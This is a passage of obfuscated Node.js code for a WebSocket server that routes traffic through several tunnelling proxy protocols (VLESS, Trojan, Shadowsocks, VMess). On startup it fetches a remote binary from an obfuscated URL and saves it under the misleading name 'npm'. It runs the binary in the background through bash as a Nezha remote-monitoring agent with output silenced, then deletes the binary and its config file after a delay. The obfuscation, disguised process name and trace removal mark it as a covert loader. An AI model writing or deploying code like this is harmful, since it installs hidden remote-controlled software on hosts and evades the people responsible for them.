_0x56bcd0=_0x567542;if(_0x5546b9&&!_0x5546b9[_0x56bcd0(_0x2468c2._0x555182)])_0x5546b9[_0x56bcd0(_0x2468c2._0x10f413)](_0x45aec8);},'close':()=>{const _0x3f38f7=_0x567542;if(_0x5546b9)_0x5546b9[_0x3f38f7(_0x7e13b6._0x2a3f64)]();}};},_0x3e9561=vmsServer({'tag':_0x480e60(_0x3c63c5._0x4542f3),'users':[vmsUser]},_0x94f398)(_0x4e880d,_0xaae174['_socket'][_0x480e60(_0x3c63c5._0x28d15a)]);return _0xaae174['on'](_0x480e60(_0x3c63c5._0x52379e),_0x30db89=>{_0x3e9561['message'](_0x30db89);}),_0x3e9561[_0x480e60(_0x3c63c5._0x4eadae)](_0x35788c),!![];}catch(_0x26b61c){return![];}}const wss=new WebSocket[(_0x2d3854(0x175))]({'server':httpServer});wss['on'](_0x2d3854(0x1ea),(_0x5a8358,_0x5cbc43)=>{const _0x1243ed={_0x1ec015:0x187,_0x2f5eb6:0x192},_0x3f2fde=_0x2d3854,_0x1812db=_0x5cbc43[_0x3f2fde(0x179)]||'',_0x2d03ea='/'+WSPATH;if(!_0x1812db[_0x3f2fde(0x1b1)](_0x2d03ea)){_0x5a8358[_0x3f2fde(0x207)]();return;}_0x5a8358['once']('message',_0x538552=>{const _0x41010b=_0x3f2fde;if(_0x538552[_0x41010b(_0x1243ed._0x1ec015)]>0x11&&_0x538552[0x0]===0x0){const _0xbff582=_0x538552[_0x41010b(_0x1243ed._0x2f5eb6)](0x1,0x11),_0x45d420=_0xbff582['every']((_0x3f31a7,_0x4b62ae)=>_0x3f31a7==parseInt(uuid['substr'](_0x4b62ae*0x2,0x2),0x10));if(_0x45d420){!handleVlsConnection(_0x5a8358,_0x538552)&&_0x5a8358['close']();return;}}if(_0x538552[_0x41010b(0x187)]>=0x3a){if(handleTrojConnection(_0x5a8358,_0x538552))return;}if(_0x538552[_0x41010b(_0x1243ed._0x1ec015)]>0x0&&(_0x538552[0x0]===0x1||_0x538552[0x0]===0x3||_0x538552[0x0]===0x4)){if(handleSsConnection(_0x5a8358,_0x538552))return;}if(_0x538552[_0x41010b(0x187)]>=0x1a){if(handleVmsConnection(_0x5a8358,_0x538552))return;}_0x5a8358[_0x41010b(0x207)]();})['on'](_0x3f2fde(0x1ac),()=>{});});const getDownloadUrl=()=>{const _0x2b62d0={_0x5cb5b6:0x1eb,_0x226841:0x182,_0x4ce35f:0x1af,_0x4e5b2c:0x1c8},_0x1c1e07=_0x2d3854,_0x32dda2=os[_0x1c1e07(0x185)]();return _0x32dda2===_0x1c1e07(_0x2b62d0._0x5cb5b6)||_0x32dda2==='arm64'||_0x32dda2===_0x1c1e07(0x1e7)?!NEZHA_PORT?_0x1c1e07(0x173):_0x1c1e07(_0x2b62d0._0x226841):!NEZHA_PORT?_0x1c1e07(_0x2b62d0._0x4ce35f):_0x1c1e07(_0x2b62d0._0x4e5b2c);},downloadFile=async()=>{const _0x299b3f={_0x1be10e:0x1d8},_0x16e36b={_0x20031e:0x1ac},_0xa098c4=_0x2d3854;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x214a96=getDownloadUrl(),_0x3ebbbc=await new Promise((_0x28562e,_0x1dd892)=>{const _0x43deb6=_0x4793;https['get'](_0x214a96,_0x4aef28=>{_0x28562e({'data':_0x4aef28});})['on'](_0x43deb6(0x1ac),_0x1dd892);}),_0x5dafee=fs[_0xa098c4(_0x299b3f._0x1be10e)]('npm');return _0x3ebbbc[_0xa098c4(0x170)][_0xa098c4(0x1b2)](_0x5dafee),new Promise((_0x3b0ca9,_0x4d00fc)=>{const _0x5378ef=_0xa098c4;_0x5dafee['on'](_0x5378ef(0x1e9),()=>{const _0x540a5e=_0x5378ef;console['log'](_0x540a5e(0x1ce)),exec(_0x540a5e(0x200),_0x286b64=>{if(_0x286b64)_0x4d00fc(_0x286b64);_0x3b0ca9();});}),_0x5dafee['on'](_0x5378ef(_0x16e36b._0x20031e),_0x4d00fc);});}catch(_0x4fd2c0){throw _0x4fd2c0;}},runnz=async()=>{const _0x5af350={_0x2a466b:0x1ba,_0xd4f6f4:0x18a,_0x22366c:0x206,_0x3f337f:0x203,_0x576da3:0x1ae,_0x5a244a:0x1a4,_0x478a9e:0x19b,_0x3f095a:0x1dd,_0x30b9c1:0x16e,_0x152bbf:0x164},_0xb555a2={_0x11dce8:0x1ac,_0x3ce84e:0x1d7,_0x5271c1:0x1f0},_0x4fbc28=_0x2d3854;try{const _0x19d881=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x19d881['trim']()!==''){console[_0x4fbc28(0x1f0)](_0x4fbc28(0x171));return;}}catch(_0x1699a2){}await downloadFile();let _0xaa229f='',_0x2d660a=[_0x4fbc28(_0x5af350._0x2a466b),_0x4fbc28(_0x5af350._0xd4f6f4),_0x4fbc28(0x172),_0x4fbc28(_0x5af350._0x22366c),_0x4fbc28(_0x5af350._0x3f337f),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5d4470=_0x2d660a[_0x4fbc28(_0x5af350._0x576da3)](NEZHA_PORT)?_0x4fbc28(0x1e5):'';_0xaa229f=_0x4fbc28(_0x5af350._0x5a244a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4fbc28(0x1e8)+NEZHA_KEY+'\x20'+_0x5d4470+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x17f3ee=NEZHA_SERVER[_0x4fbc28(0x1ae)](':')?NEZHA_SERVER['split'](':')[_0x4fbc28(_0x5af350._0x478a9e)]():'',_0x15cc2c=_0x2d660a[_0x4fbc28(0x1ae)](_0x17f3ee)?_0x4fbc28(0x1c6):_0x4fbc28(0x196),_0x30db4b=_0x4fbc28(_0x5af350._0x3f095a)+NEZHA_KEY+_0x4fbc28(0x17d)+NEZHA_SERVER+_0x4fbc28(_0x5af350._0x30b9c1)+_0x15cc2c+_0x4fbc28(0x1a9)+UUID;fs[_0x4fbc28(_0x5af350._0x152bbf)](_0x4fbc28(0x1a5),_0x30db4b);}_0xaa229f=_0x4fbc28(0x1ab);}else return;}try{exec(_0xaa229f,{'shell':'/bin/bash'},_0x3f55e3=>{const _0x4b2212=_0x4fbc28;if(_0x3f55e3)console[_0x4b2212(_0xb555a2._0x11dce8)](_0x4b2212(_0xb555a2._0x3ce84e),_0x3f55e3);else console[_0x4b2212(_0xb555a2._0x5271c1)](_0x4b2212(0x19e));});}catch(_0x4415da){console[_0x4fbc28(0x1ac)](_0x4fbc28(0x166)+_0x4415da);}};async function addAccessTask(){const _0xf450d3={_0x43fd49:0x1b5,_0x26efec:0x177},_0x4b27ea=_0x2d3854;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x46fbd2=_0x4b27ea(_0xf450d3._0x43fd49)+DOMAIN+'/'+SUB_PATH;try{const _0x3fdf5d=await httpPost(_0x4b27ea(_0xf450d3._0x26efec),{'url':_0x46fbd2});console[_0x4b27ea(0x1f0)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0xb20d51){}}const delFiles=()=>{const _0x2b71cc=_0x2d3854;[_0x2b71cc(0x1e1),_0x2b71cc(0x1a5)][_0x2b71cc(0x1f2)](_0x294eec=>fs[_0x2b71cc(0x1fd)](_0x294eec,()=>{}));};httpServer['listen'](PORT,async()=>{const _0x29218d=_0x2d3854;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x29218d(0x1f0)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
